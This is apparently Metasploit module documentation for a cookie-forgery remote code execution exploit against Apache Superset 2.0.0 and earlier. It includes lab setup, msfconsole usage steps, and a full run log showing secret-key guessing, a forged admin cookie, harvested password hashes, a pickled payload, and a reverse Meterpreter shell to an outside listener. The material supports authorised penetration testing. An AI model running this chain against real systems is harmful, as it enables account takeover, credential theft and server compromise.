## Vulnerable Application

Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies.
These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that
of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user. From there the
Superset database is mounted, and credentials are pulled. A dashboard is then created. Lastly a pickled python payload can be
set for that dashboard within Superset's database which will trigger the RCE.

An attempt to clean up ALL of the dashboard key values and reset them to their previous values happens during the cleanup phase.

### App Install

```
sudo docker run -p 8088:8088 --name superset apache/superset:2.0.0
sudo docker exec -it superset superset fab create-admin \
              --username admin \
              --firstname Superset \
              --lastname Admin \
              --email admin@superset.com \
              --password admin
sudo docker exec -it superset superset db upgrade
sudo docker exec -it superset superset init
```

Login to the app, click 'list users' under 'Settings', then click '+'. Make a new user with 'Public' as the role.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/linux/http/apache_superset_cookie_sig_rce`
1. Do: `set rhost [ip]`
1. Do: `set username [username]`
1. Do: `set password [password]`
1. Do: `run`
1. You should get a shell.

## Options

### USERNAME

The username to authenticate as. Required with no default.

### PASSWORD

The password for the specified username. Required with no default.

### ADMIN_ID

The ID of an admin account. Defaults to `1`

### SECRET_KEYS_FILE

A file containing secret keys to try. One per line. Defaults to `metasploit-framework/data/wordlists/superset_secret_keys.txt`

### DATABASE

Location on the target of the Superset database. Defaults to the Docker location `/app/superset_home/superset.db`

## Scenarios

### Apache Superset 2.0.0 on Docker

```
resource (superset_rce.rb)> use exploit/linux/http/apache_superset_cookie_sig_rce
[*] Using configured payload python/meterpreter/reverse_tcp
resource (superset_rce.rb)> set rhosts 127.0.0.1
rhosts => 127.0.0.1
resource (superset_rce.rb)> set verbose true
verbose => true
resource (superset_rce.rb)> set lhost 2.2.2.2
lhost => 2.2.2.2
resource (superset_rce.rb)> set username user
username => user
resource (superset_rce.rb)> set password user
password => user
resource (superset_rce.rb)> set proxies HTTP:127.0.0.1:8080
proxies => HTTP:127.0.0.1:8080
resource (superset_rce.rb)> set ReverseAllowProxy true
ReverseAllowProxy => true
resource (superset_rce.rb)> rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] Attempting login
[*] Grabbing CSRF token
[*] 127.0.0.1:8088 - CSRF Token: IjZmOTM2NTI4MmRmYjQyNDdkMGVmMmUxOGVjZDBhOWNmZTZiYWFmZGEi.ZQSodw.C7YXKC5pMw0rGvnJcqVT5ZFkXYQ
[*] 127.0.0.1:8088 - Attempting login
[+] 127.0.0.1:8088 - Logged in Cookie: session=.eJwNjUEKgzAQRa8SZh2KTa1Vb-Cu-yIyJjMxdIiQhJYi3r1ZPfjw_jtgYcG8UYbxdYAqFfDFFEP0oGGKH5TglOw-xIt6CmEmVdJPoce6wHzOul4kyhuMjJJJg82Jl7K_KcIIHQ-37m5643htTftwDbGha0_WNThYpm5FZIc1JrtFoepU8fwDUO8x4g.ZQSodw.VE5Y8HQDKavvXpMdUVnZrfqiokI;
[*] 127.0.0.1:8088 - Checking secret key: \x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h
[-] 127.0.0.1:8088 - Incorrect secret key: \x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h
[*] 127.0.0.1:8088 - Checking secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[+] 127.0.0.1:8088 - Found secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[*] 127.0.0.1:8088 - Modified cookie: {"_flashes"=>[{" t"=>["warning", "Invalid login. Please try again."]}], "_fresh"=>false, "csrf_token"=>"6f9365282dfb4247d0ef2e18ecd0a9cfe6baafda", "locale"=>"en", "user_id"=>1}
[*] 127.0.0.1:8088 - Attempting to resign with key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[*] 127.0.0.1:8088 - New signed cookie: eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIkludmFsaWQgbG9naW4uIFBsZWFzZSB0cnkgYWdhaW4uIl19XSwiX2ZyZXNoIjpmYWxzZSwiY3NyZl90b2tlbiI6IjZmOTM2NTI4MmRmYjQyNDdkMGVmMmUxOGVjZDBhOWNmZTZiYWFmZGEiLCJsb2NhbGUiOiJlbiIsInVzZXJfaWQiOjF9.ZQSodw.tqvbZGeoJr4hx6k8CVM_XA-_AAE
[+] 127.0.0.1:8088 - Cookie validated to user: admin
[*] Attempting to pull user creds from db
[+] Successfully created db mapping with id: 2
[*] Creating new sqllab tab
[+] Using tab: 2
[*] Setting latest query id
[*] Harvesting superset user creds
[+] Superset Creds
==============

  Username  Password
  --------  --------
  admin     $pbkdf2-sha256$260000$R203aXBtQVh3ZUlFVmREdQ$/Sivpafs38x.LXzDbxhSsvjfZC5pKpuPONqzOWnsgrk

[*] Attempting RCE
[*] Creating new dashboard
[+] New Dashboard id: 2
[*] Grabbing permalink to new dashboard to trigger payload later
[+] Dashboard permalink key: aojEJOPXQyB
[*] Grabbing values to reset later
[*] Setting latest query id
[*] Setting latest query id
[*] Uploading payload
[*] Triggering payload
[*] Sending stage (24772 bytes) to 1.1.1.1
[*] Meterpreter session 1 opened (2.2.2.2:4444 -> 1.1.1.1:57716) at 2023-09-15 14:54:49 -0400
[*] Unsetting RCE Payloads
[*] Restoring row ID 1
[*] Setting latest query id
[+] Successfully restored
[*] Restoring row ID 3
[*] Setting latest query id
[+] Successfully restored
[*] Deleting dashboard
[*] Deleting sqllab tab
[*] Deleting database mapping

meterpreter > getuid
Server username: superset
meterpreter > sysinfo
Computer        : 2f7ff4a15c36
OS              : Linux 6.4.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.4.11-1kali1 (2023-08-21)
Architecture    : x64
System Language : C
Meterpreter     : python/linux
```
